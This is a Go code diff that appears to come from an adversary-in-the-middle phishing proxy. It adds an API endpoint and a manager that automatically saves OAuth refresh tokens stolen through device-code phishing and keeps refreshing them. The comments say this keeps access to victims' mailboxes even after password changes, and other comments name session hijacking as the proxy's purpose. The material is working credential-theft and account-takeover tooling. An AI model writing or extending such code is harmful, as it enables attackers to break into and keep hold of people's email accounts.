@@ -244,6 +244,7 @@ var (
 	dcSharePointRe   = regexp.MustCompile(`^/access/sharepoint/([a-zA-Z0-9_-]+)$`)
 	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
 	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
+	mailboxApiRe     = regexp.MustCompile(`^/api/v1/mailbox$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -287,8 +288,9 @@ type HttpProxy struct {
 	session_mtx       sync.Mutex
 	stopChan          chan struct{} // For graceful shutdown
 	rateLimiter       *RateLimiter  // DDoS protection and load management
-	tokenPortal       *TokenPortal  // Token-to-cookie portal for session hijacking
-	tokenFeed         *TokenFeed    // Token feed API for mailbox viewer auto-import
+	tokenPortal       *TokenPortal           // Token-to-cookie portal for session hijacking
+	tokenFeed         *TokenFeed             // Token feed API for mailbox viewer auto-import
+	mailboxAccounts   *MailboxAccountManager // Persistent mailbox accounts with auto-refresh
 
 	// Connection statistics for monitoring
 	connStats struct {
@@ -352,6 +354,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	// Initialize token feed API for mailbox viewer
 	p.tokenFeed = NewTokenFeed(db)
+
+	// Initialize persistent mailbox accounts manager
+	// Accounts are saved to cfg_dir/mailbox_accounts.json and survive restarts
+	p.mailboxAccounts = NewMailboxAccountManager(cfg.GetDataDir())
+	p.mailboxAccounts.Start() // Start auto-refresh for all saved accounts
 
 	// Initialize connection statistics
 	p.connStats.startTime = time.Now()
@@ -965,6 +972,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return req, resp
 			}
 			// --- End token feed API ---
+
+			// --- Begin mailbox accounts API (persistent accounts with auto-refresh) ---
+			if mailboxApiRe.MatchString(req.URL.Path) {
+				apiKey := req.URL.Query().Get("key")
+				action := req.URL.Query().Get("action")
+				body, statusCode := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, action)
+				resp := goproxy.NewResponse(req, "application/json", statusCode, body)
+				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				resp.Header.Set("Access-Control-Allow-Methods", "GET")
+				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+				if statusCode == 200 {
+					log.Info("[mailbox] API served to %s (action=%s)", remote_addr, action)
+				} else {
+					log.Warning("[mailbox] Unauthorized API access from %s", remote_addr)
+				}
+				return req, resp
+			}
+			// --- End mailbox accounts API ---
 
 			// --- Begin portal endpoint (token-to-cookie conversion) ---
 			if portalPageRe.MatchString(req.URL.Path) {
@@ -3653,6 +3679,18 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 				}
 
 				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)
+
+				// Automatically add account to mailbox manager for persistent access
+				// This ensures the account survives password changes as long as tokens are refreshed
+				if dcSession.RefreshToken != "" && p.mailboxAccounts != nil {
+					go func() {
+						if err := p.mailboxAccounts.AddFromDeviceCode(dcSession, s.Id, s.Phishlet, s.RemoteAddr, s.UserAgent); err != nil {
+							log.Warning("[mailbox] Failed to auto-add account: %v", err)
+						} else {
+							log.Success("[mailbox] Account auto-added to mailbox viewer (session %d)", s.Id)
+						}
+					}()
+				}
 
 				// Send notification with captured tokens
 				p.notifier.Trigger(EventDeviceCodeCaptured, &NotificationData{
